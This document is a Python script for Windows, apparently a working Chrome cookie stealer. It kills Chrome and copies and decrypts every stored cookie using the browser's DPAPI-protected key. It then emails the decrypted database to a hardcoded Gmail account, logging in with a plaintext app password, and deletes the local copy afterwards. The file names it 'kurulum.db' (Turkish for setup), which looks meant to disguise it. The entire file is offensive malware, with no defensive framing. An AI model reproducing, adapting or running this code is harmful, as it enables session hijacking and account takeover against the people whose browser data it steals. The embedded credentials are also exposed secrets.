import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import win32crypt 
from Crypto.Cipher import AES
import time
import psutil



def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""

def sendmail():
    # Python code to illustrate Sending mail with attachments 
    # from your Gmail account 

    # libraries to be imported 
    import smtplib 
    from email.mime.multipart import MIMEMultipart 
    from email.mime.text import MIMEText 
    from email.mime.base import MIMEBase 
    from email import encoders 

    fromaddr = "b3yd4.iht@gmail.com"
    toaddr = "b3yd4.iht@gmail.com"

    # instance of MIMEMultipart 
    msg = MIMEMultipart()

    # storing the senders email address 
    msg['From'] = fromaddr 

    # storing the receivers email address 
    msg['To'] = toaddr 

    # storing the subject 
    msg['Subject'] = "çerEZler geldi"

    # string to store the body of the mail 
    body = "MMMM ÇEREZZZ"

    # attach the body with the msg instance 
    msg.attach(MIMEText(body, 'plain')) 

    # open the file to be sent 
    filename = "kurulum.db"
    attachment = open(os.path.join(os.environ["USERPROFILE"],"AppData", "kurulum.db"), "rb") #open("kurulum.db", "rb") 

    # instance of MIMEBase and named as p 
    p = MIMEBase('application', 'octet-stream') 

    # To change the payload into encoded form 
    p.set_payload((attachment).read()) 

    # encode into base64 
    encoders.encode_base64(p) 

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 

    # attach the instance 'p' to instance 'msg' 
    msg.attach(p) 

    # creates SMTP session 
    s = smtplib.SMTP('smtp.gmail.com', 587) 

    # start TLS for security 
    s.starttls() 

    # Authentication 
    s.login(fromaddr, "bxao pdxm dqiw kzjj") 

    # Converts the Multipart msg into a string 
    text = msg.as_string() 

    # sending the mail 
    s.sendmail(fromaddr, toaddr, text) 

    # terminating the session 
    s.quit()

def main():
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    filename = os.path.join(os.environ["USERPROFILE"], "AppData", "kurulum.db")
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies""")

    key = get_encryption_key()
    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
        if not value:
            decrypted_value = decrypt_data(encrypted_value, key)
        else:
            decrypted_value = value
            
        #print(f"""
        #Host: {host_key}
        #Cookie name: {name}
        #Cookie value (decrypted): {decrypted_value}
        #Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
        #Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
        #Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
        #===============================================================
        #""")

        cursor.execute("""
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
        WHERE host_key = ?
        AND name = ?""", (decrypted_value, host_key, name))

    db.commit()

    db.close()

    sendmail()

def detectChrome(exename='chrome.exe'):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == exename:
            os.system('taskkill /f /im chrome.exe')
            break

if __name__ == "__main__":
    detectChrome()
    time.sleep(1)
    main()
    os.remove(os.path.join(os.environ["USERPROFILE"], "AppData", "kurulum.db")) #os.remove('C:/Program Files/kurulum.db')
